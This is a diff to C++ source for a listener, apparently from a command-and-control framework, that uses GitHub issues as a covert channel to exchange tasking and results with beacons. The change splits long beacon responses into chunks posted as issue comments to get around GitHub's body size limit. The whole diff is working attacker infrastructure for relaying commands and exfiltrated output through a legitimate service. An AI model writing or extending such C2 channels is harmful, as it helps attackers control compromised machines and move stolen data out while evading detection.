@@ -50,7 +50,9 @@ void ListenerGithub::checkGithubIssues()
 		endpoint += "/issues";	
 		auto response = cli.Get(endpoint, headers);
 
-		if(response->status!=200)
+		std::cout << "response->status " << response->status << std::endl;
+
+		if(response->status!=200 && response->status!=201)
 		{
 			DEBUG("Error with the ListenerGithub: " << response->body);
 			continue;
@@ -66,6 +68,13 @@ void ListenerGithub::checkGithubIssues()
 				std::string title = (*it)["title"];
 				std::string body = (*it)["body"];
 				int number = (*it)["number"];
+				int nbComments = (*it)["comments"];
+
+				// TODO handle big response with multiple comments
+				if(nbComments!=0)
+				{
+					std::cout << "Issue with comments: " << std::to_string(number) << std::endl;;
+				}
 
 				DEBUG("[+] handle issue: " << std::to_string(number));
 
@@ -89,25 +98,86 @@ void ListenerGithub::checkGithubIssues()
 						std::string reponseTitle = "RequestC2: ";   
 						reponseTitle+=beaconHash;
 
-						json responseData = {
+						// body too long need to split it
+						int maxChunkSize = 65000;
+						if(res.size()>=maxChunkSize)
+						{
+							DEBUG("Split response");
+							std::vector<std::string> chunks;
+							for (std::size_t i = 0; i < res.size(); i += maxChunkSize) 
+							{
+								chunks.push_back(res.substr(i, maxChunkSize));
+							}
+
+							std::cout << "Split response of " << chunks.size() << " chunks" << std::endl;
+
+							json responseData = {
+							{"title", reponseTitle},
+							{"body", chunks[0]},
+							};
+
+							std::string data = responseData.dump();
+
+							std::string contentType = "application/json";
+							auto response = cli.Post(endpoint, headers, data, contentType);
+
+							std::cout << "Issue created " << response->status << std::endl;
+							
+							if(response->status!=200 && response->status!=201)
+							{
+								DEBUG("Error with the ListenerGithub: " << response->body);
+								continue;
+							}
+
+							json my_json = json::parse(response->body);
+							int number = my_json["number"];
+		
+							for (std::size_t i = 1; i < chunks.size(); i++) 
+							{
+								json responseData = {
+									{"body", chunks[i]},
+									};
+
+								std::string data = responseData.dump();
+
+								std::string contentType = "application/json";
+								std::string issueEndpoint = "/repos/";
+								issueEndpoint += m_project;	
+								issueEndpoint += "/issues/";
+								issueEndpoint += std::to_string(number);	
+								issueEndpoint += "/comments";
+								auto response = cli.Post(issueEndpoint, headers, data, contentType);
+
+								std::cout << "Comments created " << response->status << std::endl;
+
+								if(response->status!=200 && response->status!=201)
+								{
+									std::cout << "Comments error " << response->body << std::endl;
+
+									DEBUG("Error with the ListenerGithub: " << response->body);
+									continue;
+								}
+							}
+						}
+						else
+						{
+							DEBUG("Simple reponse");
+
+							json responseData = {
 							{"title", reponseTitle},
 							{"body", res},
 							};
 
-						std::string data = responseData.dump();
-						std::string contentType = "application/json";
-						auto response = cli.Post(endpoint, headers, data, contentType);
+							std::string data = responseData.dump();
 
-						// TODO
-						// std::cout << "!!! !!!! response " << response->body << std::endl;
-						// {"message":"Validation Failed","errors":[{"resource":"Issue","code":"custom","field":"body","message":"body is too long"},
-						  // {"resource":"Issue","code":"custom","field":"body","message":"body is too long (maximum is 65536 characters)"}],
-						  // "documentation_url":"https://docs.github.com/rest/issues/issues#create-an-issue"}
+							std::string contentType = "application/json";
+							auto response = cli.Post(endpoint, headers, data, contentType);
 
-						if(response->status!=200)
-						{
-							DEBUG("Error with the ListenerGithub: " << response->body);
-							continue;
+							if(response->status!=200 && response->status!=201)
+							{
+								DEBUG("Error with the ListenerGithub: " << response->body);
+								continue;
+							}
 						}
 					}
 
